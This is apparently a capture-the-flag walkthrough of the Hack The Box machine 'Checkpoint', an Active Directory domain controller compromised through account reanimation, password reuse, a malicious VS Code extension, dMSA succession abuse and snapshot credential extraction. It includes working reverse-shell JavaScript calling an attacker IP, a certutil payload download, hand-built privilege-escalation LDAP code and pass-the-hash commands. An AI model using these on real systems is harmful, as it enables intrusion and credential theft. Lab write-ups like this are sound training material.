# Checkpoint (HTB, Medium, Windows)

Checkpoint is a Server 2025 domain controller, and it's the first box in a while where almost none of the difficulty was in the techniques themselves. The chain reads clean on paper: restore a deleted account, ride password reuse into a file share, plant a malicious VS Code extension for a shell, abuse a delegated service account to inherit privileges, then pull an Administrator hash out of a VM memory snapshot. What actually ate the time was tooling, because half of it doesn't speak to a signing-enforced 2025 DC properly yet, and the escalation technique is new enough that I ended up building it by hand with raw LDAP. So this is as much a writeup about fighting your own toolbox as it is about the box.

One thing up front that colored everything: I ran this from Kali in a VM on an Apple-silicon laptop, and the hypervisor kept resyncing the guest clock about 7 hours behind the DC, between commands. Kerberos has a hard 5-minute skew window, so every Kerberos step kept dying until I wrapped each one in `faketime -f "+7h"`, which fakes the clock for a single process so the hypervisor can't stomp it mid-command. If your host keeps time normally you won't need it, but on mine it was the difference between working and not.

## Recon

Nmap paints the usual domain controller picture:

```bash
nmap -p- --min-rate 1000 -T4 10.129.187.98
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.129.187.98
```

DNS, Kerberos, LDAP and the global catalog, SMB, ADWS on 9389, WinRM on 5985. The LDAP banner gives up `checkpoint.htb` and the host `DC01`, and the SMB string pins it as Windows Server 2025 Build 26100. Two details mattered later: the `smb2-time` script showed the 7-hour clock skew, and the OS being this new told me to expect misconfiguration rather than some old CVE, which is exactly how it played out.

Point the names at the IPv4 address in `/etc/hosts`. The box dual-stacks, the IPv6 path is flaky over the VPN, and anything that resolves by name (bloodhound-python especially) will grab the `dead:beef::` address and hang.

```bash
echo '10.129.187.98  dc01.checkpoint.htb checkpoint.htb dc01' | sudo tee -a /etc/hosts
```

## SMB as alex.turner

This is an assumed-breach box, so we start with `alex.turner : Checkpoint2024!`. First authenticated move on any Windows target is to ask what shares the account can reach, and the detail that matters is which ones are readable, not just which ones exist, so use a tool that reports permissions.

```bash
nxc smb 10.129.187.98 -u alex.turner -p 'Checkpoint2024!' --shares --smb-timeout 15
```

```
DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
VMBackups
```

(The defaults and the two shares every domain user can read are trimmed out.) `DevDrop` is custom, readable, and its remark basically narrates the attack: a share for approved VS Code `.vsix` packages pinned to engine `1.118.0`. That's a drop folder something on the box consumes. `VMBackups` shows up with no permissions at all, so alex.turner can't even list it, which makes it an obvious later target. The first readable custom share is the answer to the opening question, and it's `DevDrop`.

The first `--shares` run died with a `NetBIOSTimeout` right after authenticating. The box's SMB flakes under VPN, so `--smb-timeout 15` or just re-running fixes it. It's not a real failure, and it happens more than once across the box.

## The deleted account in the Recycle Bin

Deleted objects are a good place to go looking. When the AD Recycle Bin is on, a deleted account isn't purged, it's flagged `isDeleted=TRUE` and parked in `CN=Deleted Objects` with most of its attributes still attached. People delete accounts assuming the secrets leave with them, and they usually don't.

The problem is that normal LDAP queries don't return deleted objects at all. You have to attach the Show Deleted Objects control, OID `1.2.840.113556.1.4.417`. And this DC enforces LDAP signing, so a plain bind is refused outright with "Strong(er) authentication required".

I lost real time here, so it's worth listing what does not work on this box, because you'll reach for all of it: `ldapsearch` simple bind (rejected for signing), `ldapsearch` over LDAPS on 636 (the self-signed cert resets every Linux TLS client, and I hit this same reset from four different tools, which is how you know it's the target and not the client), `ldapsearch -Y GSS-SPNEGO` (missing SASL module), `ldap3` NTLM sealing (the kwarg doesn't exist in the Kali version), `ldap3` GSSAPI (python-gssapi version crash), `bloodhound-python` (refuses unsigned LDAP, falls back to LDAPS, dies on the same reset), and `nxc ldap --query` against the deleted-objects base (authenticates but returns nothing because it doesn't send the control).

What finally worked was impacket, whose `kerberosLogin` seals the channel on 389 and lets you attach the control. That needs a working ticket, so set up Kerberos first.

```ini
# /etc/krb5.conf
[libdefaults]
    default_realm = CHECKPOINT.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false
[realms]
    CHECKPOINT.HTB = { kdc = dc01.checkpoint.htb }
[domain_realm]
    .checkpoint.htb = CHECKPOINT.HTB
    checkpoint.htb = CHECKPOINT.HTB
```

```bash
sudo apt install -y krb5-user
sudo ntpdate -u 10.129.187.98 && kinit alex.turner@CHECKPOINT.HTB
```

A trap worth knowing: `kinit` kept telling me "Password incorrect" even though the password was fine. MIT Kerberos reports clock skew on the pre-auth as "Password incorrect", so a correct password plus a drifted clock looks identical to a wrong one. That's the hypervisor clock again, and faketime is the real fix.

Now pull the deleted objects with the control attached:

```bash
TZ=UTC faketime -f "+7h" python3 - <<'EOF'
from impacket.ldap import ldap
from impacket.ldap.ldapasn1 import Control
l = ldap.LDAPConnection('ldap://dc01.checkpoint.htb', 'DC=checkpoint,DC=htb', 'dc01.checkpoint.htb')
l.kerberosLogin('alex.turner', 'Checkpoint2024!', 'checkpoint.htb', useCache=True)
ctrl = Control()
ctrl['controlType'] = b'1.2.840.113556.1.4.417'   # Show Deleted Objects
ctrl['criticality'] = True
resp = l.search(searchBase='CN=Deleted Objects,DC=checkpoint,DC=htb',
                searchFilter='(objectClass=user)', searchControls=[ctrl],
                attributes=['sAMAccountName','distinguishedName','isDeleted'])
for item in resp:
    try: print(item.prettyPrint())
    except Exception: pass
EOF
```

```
objectName=CN=Mark Davies\0ADEL:2217e877-...,CN=Deleted Objects,DC=checkpoint,DC=htb
  isDeleted = TRUE
  sAMAccountName = mark.davies
```

There's the deleted account, `mark.davies`. That `\0ADEL:<GUID>` mess in the CN is how AD renames tombstones on deletion so they can't collide with live objects, and once you've seen it you spot a tombstone in raw LDAP instantly. The reason this whole path exists is the ACLs on alex.turner: WriteDacl on the Deleted Objects container, Write on the mark.davies object, CreateChild on its old OU, and the Reanimate-Tombstones right. `bloodyAD get writable` shows most of that.

## Reanimate it, then test for reuse

bloodyAD's Kerberos and LDAPS paths both failed here (etype mismatch and the TLS reset), but plain NTLM worked, because bloodyAD seals the channel itself without needing a ticket or LDAPS:

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'mark.davies'
# [+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

Pass the sAMAccountName, not the GUID, because the tool builds its filter around sAMAccountName. And if an earlier attempt already restored the account you'll get a `NoResultError`, which just means there's nothing left in the recycle bin, not that it failed.

A restored account comes back with the password it had when it was deleted. We don't know that password, so the move is to test for reuse, and this environment reuses passwords everywhere:

```bash
nxc smb dc01.checkpoint.htb -u mark.davies -p 'Checkpoint2024!'
# [+] checkpoint.htb\mark.davies:Checkpoint2024!
```

`Checkpoint2024!` still authenticates it, which answers the "which password works on the restored account" question. And the payoff shows up immediately:

```bash
nxc smb dc01.checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares --smb-timeout 15
# DevDrop   READ,WRITE   ...
```

alex.turner only had READ on DevDrop. mark.davies has WRITE. That write access is the entire reason the account was worth restoring.

## Foothold through a malicious VS Code extension

A VS Code extension is just Node.js that the editor runs in-process with no sandbox, using the privileges of whoever launched the editor, so a share that collects extensions for installation is unsandboxed code execution waiting to happen. The remark even gave us the engine version to target.

The piece that makes it hands-off is the activation event. Extensions lazy-load based on events in `package.json`, and most of them need the victim to do something first, like open a specific file type or run a command. The one that fires on its own, right after the editor finishes loading, with no interaction at all, is `onStartupFinished`. That's the answer to the activation-event question, and it's why the attack is reliable: a scheduled task on the box installs whatever lands in the share and opens the editor, and `onStartupFinished` turns "installed" straight into "running".

A `.vsix` is just an OPC zip (two metadata files at the root plus an `extension/` folder), so you can build it by hand with no Node toolchain. My callback was `10.10.14.213:9090`.

```bash
mkdir -p ~/checkpoint/beautify/extension && cd ~/checkpoint/beautify

cat > '[Content_Types].xml' <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="json" ContentType="application/json"/>
<Default Extension="vsixmanifest" ContentType="text/xml"/>
<Default Extension="js" ContentType="application/javascript"/>
</Types>
EOF

cat > extension.vsixmanifest <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
<Metadata>
<Identity Language="en-US" Id="beautify" Version="1.0.0" Publisher="devteam"/>
<DisplayName>Beautify</DisplayName>
<Properties><Property Id="Microsoft.VisualStudio.Code.Engine" Value="^1.118.0"/></Properties>
</Metadata>
<Installation><InstallationTarget Id="Microsoft.VisualStudio.Code"/></Installation>
<Assets><Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" Addressable="true"/></Assets>
</PackageManifest>
EOF

cat > extension/package.json <<'EOF'
{
"name": "beautify","displayName": "Beautify","version": "1.0.0","publisher": "devteam",
"engines": { "vscode": "^1.118.0" },"activationEvents": ["onStartupFinished"],"main": "./extension.js"
}
EOF

cat > extension/extension.js <<'EOF'
const net = require("net");
const cp = require("child_process");
function activate(context) {
  const client = new net.Socket();
  const sh = cp.spawn("cmd.exe", []);
  client.connect(9090, "10.10.14.213", function () {
    client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);
    client.on("close", function () { sh.kill(); });
  });
  client.on("error", function () { setTimeout(() => activate(context), 5000); });
}
function deactivate() {}
module.exports = { activate, deactivate };
EOF

zip -r beautify.vsix '[Content_Types].xml' extension.vsixmanifest extension/
```

The retry loop in the error handler earns its place. If the editor launches before your listener is up, the extension just keeps retrying every 5 seconds instead of giving up, so a timing miss doesn't cost you the shell.

Start a listener, drop the file as mark.davies, and wait a few minutes for the scheduled task:

```bash
nc -lvnp 9090
smbclient //dc01.checkpoint.htb/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put beautify.vsix'
```

```
connect to [10.10.14.213] from (UNKNOWN) [10.129.187.98] 57051
C:\Program Files\Microsoft VS Code>whoami
checkpoint\ryan.brooks
```

We land as `ryan.brooks`, the developer whose session installed the extension, not as mark.davies who uploaded it. That's the defining feature of a drop-folder attack: you become the account that consumes the artifact, and the uploader was only the delivery mechanism. So the answer to "which account do you land as" is ryan.brooks, and the user flag is in his desktop.

```cmd
type C:\Users\ryan.brooks\Desktop\user.txt
```

## Lateral movement with BetterSuccessor

Checking what ryan.brooks can do turns up the two rights the whole escalation hinges on:

```powershell
Import-Module ActiveDirectory
(Get-Acl "AD:\OU=DMSAHolder,DC=checkpoint,DC=htb").Access | ? {$_.IdentityReference -like "*ryan*"} | Select ActiveDirectoryRights
(Get-Acl "AD:\CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb").Access | ? {$_.IdentityReference -like "*ryan*"} | Select ActiveDirectoryRights
```

CreateChild on `OU=DMSAHolder`, and GenericWrite on `svc_deploy`. That pairing is the ingredient list for BetterSuccessor.

Server 2025 added delegated Managed Service Accounts, and when a dMSA supersedes an older account the KDC carries the predecessor's identity and groups into tickets for the dMSA, so services keep working through a migration. The original attack, BadSuccessor, abused that: anyone who could create a dMSA pointed it at a privileged account and got a ticket carrying that account's rights, with no permissions over the target at all. Microsoft patched it in August 2025 by requiring the link to be mutual, the dMSA pointing at the predecessor and the predecessor pointing back, on the assumption an attacker couldn't set the reverse link. BetterSuccessor is the post-patch version: the KDC only checks that the mutual pairing exists, not who built it, so if you already hold write over the predecessor (we have GenericWrite on svc_deploy) you just set the reverse link yourself. CreateChild makes the dMSA, GenericWrite completes the pairing. The name of the technique is the answer to that question: BetterSuccessor.

The clean tools for this (bloodyAD's `add badSuccessor`, or SharpSuccessor) were both out. bloodyAD runs from Kali and would need to authenticate as ryan.brooks, but we only have code execution in his session, not a credential, and ryan can't reset his own password (`net user` returns access denied, and so does ADSI `SetPassword`). SharpSuccessor means uploading a flagged binary to a domain controller. So I built the dMSA by hand with raw ADSI from inside the ryan.brooks shell, where I already hold his rights. This is the part the normal writeups skip, and it taught me the most.

A practical note before the commands: the raw `nc` shell mangles long pasted lines, and at one point a fresh scheduled-task callback replaced my PowerShell session with a new cmd.exe mid-command. The fix is to write each script to a file and run it with `powershell -ep bypass -File`, which is how everything below was actually done.

`New-ADServiceAccount` only makes a gMSA, so the dMSA attributes come back as "not legal for its class" and you need a raw `DirectoryEntry.Create`. My first creates failed with "did not satisfy one or more constraints associated with the class", so instead of guessing attributes I asked the schema what's mandatory:

```powershell
([ADSI]"LDAP://schema/msDS-DelegatedManagedServiceAccount").MustContain
# cn, instanceType, msDS-DelegatedMSAState, msDS-ManagedPasswordInterval,
# nTSecurityDescriptor, objectCategory, objectClass, objectSid, sAMAccountName
```

The one I kept missing was `msDS-DelegatedMSAState`. The bigger lesson, which cost me several rounds, is that the linked and security-descriptor attributes have to be written during the privileged create, not afterward. Setting `msDS-ManagedAccountPrecededByLink` as a separate modify after creation returns access denied, because CreateChild grants create, not arbitrary post-create writes. So everything goes into one create: the mandatory set, the forward link, the migration state, and the password-retrieval ACL (`msDS-GroupMSAMembership`) granting a principal we control (mark.davies) so we can request the ticket later.

```powershell
$sid=([ADSISearcher]"(sAMAccountName=mark.davies)").FindOne().Properties["objectsid"][0]
$s=(New-Object System.Security.Principal.SecurityIdentifier($sid,0)).Value
$ou=[ADSI]"LDAP://OU=DMSAHolder,DC=checkpoint,DC=htb"
$d=$ou.Create("msDS-DelegatedManagedServiceAccount","CN=svc_backup")
$d.Put("sAMAccountName","svc_backup$")
$d.Put("msDS-DelegatedMSAState",2)
$d.Put("msDS-ManagedPasswordInterval",30)
$d.Put("msDS-ManagedAccountPrecededByLink","CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb")
$sd=New-Object System.DirectoryServices.ActiveDirectorySecurity
$sd.SetSecurityDescriptorSddlForm("O:SYD:(A;;0xf01ff;;;$s)")
$d.Put("msDS-GroupMSAMembership",$sd.GetSecurityDescriptorBinaryForm())
$d.SetInfo()
```

The reverse link on svc_deploy is the GenericWrite half, and it's the part the normal cmdlets lie about. `Set-ADObject` and ADSI `Put` both report success without the value actually sticking for these attributes, so you need a raw `System.DirectoryServices.Protocols.ModifyRequest`, which returns the real server result code:

```powershell
Add-Type -AssemblyName System.DirectoryServices.Protocols
$l=New-Object System.DirectoryServices.Protocols.LdapConnection("DC01.checkpoint.htb")
$l.AuthType="Negotiate"; $l.Bind()
$m=New-Object System.DirectoryServices.Protocols.ModifyRequest
$m.DistinguishedName="CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
$a1=New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
$a1.Name="msDS-SupersededManagedAccountLink"; $a1.Operation="Replace"; [void]$a1.Add("CN=svc_backup,OU=DMSAHolder,DC=checkpoint,DC=htb")
$a2=New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
$a2.Name="msDS-SupersededServiceAccountState"; $a2.Operation="Replace"; [void]$a2.Add("2")
[void]$m.Modifications.Add($a1); [void]$m.Modifications.Add($a2)
$l.SendRequest($m).ResultCode     # Success
```

The thing that nearly sent me in circles: these linked and SD attributes read back blank even when they're set correctly. The superseded link, the back-linked preceded-by link, and the retrieval ACL (which comes back as a COM object instead of bytes) all return empty through normal ADSI reads. I spent a while convinced the writes were failing when they weren't. The proof they'd stuck was that a later `Add` on the link returned "the attribute exists or the value has been assigned". The takeaway is to stop trusting the readbacks and let the KDC be the judge when you request the ticket.

For the ticket, impacket 0.13.1's `getST` supports `-dmsa`, and I got the correct invocation straight from the tool's own source header, which documents it as `-impersonate dmsa$ -self -dmsa domain/user`. So you authenticate as the principal allowed to retrieve the dMSA (mark.davies), impersonate the dMSA itself (`svc_backup$`), with `-self` and `-dmsa`, and no `-spn` because dmsa mode targets krbtgt internally.

My first real attempt returned `KDC_ERR_CLIENT_REVOKED`, which means the dMSA was disabled. Its `userAccountControl` was `4130`, which decodes to WORKSTATION_TRUST_ACCOUNT plus PASSWD_NOTREQD plus ACCOUNTDISABLE, so I cleared the disable bit back to 4096 with the same ModifyRequest pattern. CLIENT_REVOKED at the S4U2self stage means "check the disable bit". Then the ticket minted:

```bash
faketime -f "+7h" impacket-getST -dmsa -self -impersonate 'svc_backup$' \
  'checkpoint.htb/mark.davies:Checkpoint2024!' -dc-ip 10.129.187.98
# [*] Requesting S4U2self
# [*] Current keys: ...
# [*] Saving ticket in svc_backup$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache
```

Those current and previous keys are the dMSA key package. The KDC honored the forged succession, handed back key material, and the ticket's PAC now carries svc_deploy's identity and groups. For reference, the errors I walked through on this one command were: `-spn is required` (add `-self`), `-impersonate is required` (add the dMSA), `KRB_AP_ERR_SKEW` (faketime), `KRB_ERR_GENERIC 60` (I'd impersonated mark.davies instead of the dMSA), and CLIENT_REVOKED (the disable bit).

Load the ticket and the previously-denied share opens up:

```bash
export KRB5CCNAME="$(ls -t *svc_backup*.ccache | head -1)"
faketime -f "+7h" nxc smb dc01.checkpoint.htb --use-kcache --shares
# VMBackups   READ
```

The group that unlocks it is `BackupAccess`: the share is ACL'd to it, svc_deploy is a member, and our ticket's PAC asserts it. That's the answer to the "which inherited group gives access to the backup share" question. WinRM in as the dMSA (make sure `KRB5CCNAME` is actually exported, a blank variable is why evil-winrm hung on me once):

```bash
faketime -f "+7h" evil-winrm -i dc01.checkpoint.htb -r CHECKPOINT.HTB
```

```powershell
whoami /groups
# CHECKPOINT\BackupAccess, CHECKPOINT\svc_deploy, BUILTIN\Remote Management Users
```

The token asserts svc_deploy and BackupAccess even though we authenticated as the nobody account svc_backup$. That is the entire point of BetterSuccessor, and Remote Management Users is why WinRM works at all.

## Root from a VMware memory snapshot

The backup share holds a VMware snapshot of a decommissioned Server 2019 host:

```powershell
cd "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics"
dir
# Windows Server 2019-Snapshot1.vmem   2147483648   (RAM image)
# Windows Server 2019-Snapshot1.vmsn    138164859   (saved state)
```

When you snapshot a running VM, the hypervisor dumps the entire guest RAM to the `.vmem` and the saved device and memory state to the `.vmsn`. So the `.vmem` is a complete offline copy of that server's memory, including the part of LSASS holding cached credentials, and the `.vmsn` is the saved-state file that a parser uses to map it. That `.vmsn` is the answer to the snapshot question. The reason this is so effective is worth sitting with: PPL, Credential Guard, and anti-dump drivers all protect a running LSASS, and none of that matters here because you're reading a file, not touching a live process. Offline memory forensics walks around every runtime protection.

VMkatz parses these files with the same credential logic mimikatz uses on a live process. Get the maintained original, `nikaiw/VMkatz`, and verify it against the release checksums rather than grabbing a stranger's "prebuilt" fork, because this is a binary headed for a domain controller:

```bash
curl -L -O https://github.com/nikaiw/VMkatz/releases/download/v1.5.2/vmkatz-v1.5.2-windows-x86_64.zip
curl -L -O https://github.com/nikaiw/VMkatz/releases/download/v1.5.2/SHA256SUMS.txt
sha256sum -c SHA256SUMS.txt 2>/dev/null | grep -i windows-x86_64   # OK
unzip -o vmkatz-v1.5.2-windows-x86_64.zip
```

evil-winrm's `upload` fell over with a Ruby bug (`no implicit conversion of nil into String`), so I served the file over HTTP and pulled it with certutil instead, which is more reliable anyway:

```bash
python3 -m http.server 8000    # on Kali
```

```powershell
cd C:\Windows\Temp; mkdir vmk; cd vmk
certutil -urlcache -split -f http://10.10.14.213:8000/vmkatz.exe C:\Windows\Temp\vmk\vmkatz.exe
.\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn"
```

```
[+] SAM Hashes:
  RID: 500   Administrator   NT:f29e9c014295b9b32139b09a2790be3b
...
  [MSV1_0] Administrator NT Hash : f29e9c014295b9b32139b09a2790be3b
```

The local Administrator NT hash, confirmed twice (once from the SAM hives, once from the captured LSASS session). On paper a local server's Administrator hash shouldn't open the DC, and it does here for the same reason the whole box works: the Administrator password was reused across the decommissioned server and the domain. Since NTLM only needs the hash, Pass-the-Hash finishes it:

```bash
faketime -f "+7h" nxc smb dc01.checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
# [+] checkpoint.htb\Administrator:f29e9c...be3b (Pwn3d!)
faketime -f "+7h" evil-winrm -i dc01.checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
```

```powershell
whoami; hostname      # checkpoint\administrator on DC01
type C:\Users\max.palmer\Desktop\root.txt
```

Domain Admin.

## The thread running through the whole box

Every stage is password reuse or a writable thing consumed by something more privileged. `Checkpoint2024!` carries across three accounts, a deleted account comes back with reuse intact, a restored user can write to a share a developer's editor executes from, a low-priv user can forge a service-account succession, and finally the Administrator password turns out to be shared between a backup image and the live domain. The techniques look unrelated (recycle bin, VS Code, dMSA, memory forensics) but it's really one failure, trust placed in something that shouldn't have been trusted, wearing four costumes.

## Fixes

Rotate reused passwords and make account secrets unique, because that single habit is what links every stage. Audit who can write to the Deleted Objects container and to tombstones, since reanimation turns a "deleted" account back into a live credential. Don't auto-install extensions from a writable share, since a `.vsix` is unsandboxed Node that runs as whoever opens the editor. Control who can create dMSAs and who holds write over service accounts, because the August 2025 patch only checks that the succession link exists, not that it's legitimate. And treat VMware snapshot files in a backup share as secrets, because `.vmem` and `.vmsn` are offline LSASS dumps that sail past PPL and Credential Guard.

## Tooling notes

A few Kali-specific things that cost me time. The hypervisor kept resetting the guest clock about 7 hours behind, so wrap every Kerberos command in `faketime -f "+7h"`, and remember `kinit` reports skew as "Password incorrect". The DC enforces LDAP signing and its LDAPS endpoint resets Linux TLS clients, so only signed binds on 389 work, which means impacket's kerberosLogin and bloodyAD over NTLM are fine and ldapsearch, ldap3, bloodhound-python, and anything on 636 are not. The raw nc shell fragments long pasted commands, so write PowerShell to a file and run it with `-File`. For the hand-built dMSA: read the schema's MustContain, set linked and SD attributes during the Create because post-create writes are denied, expect those attributes to read back blank even when set, use `getST -dmsa -self -impersonate 'svc_backup$'`, and clear the ACCOUNTDISABLE bit if you hit CLIENT_REVOKED. And evil-winrm's upload threw a Ruby error, so transfer with certutil over HTTP instead.
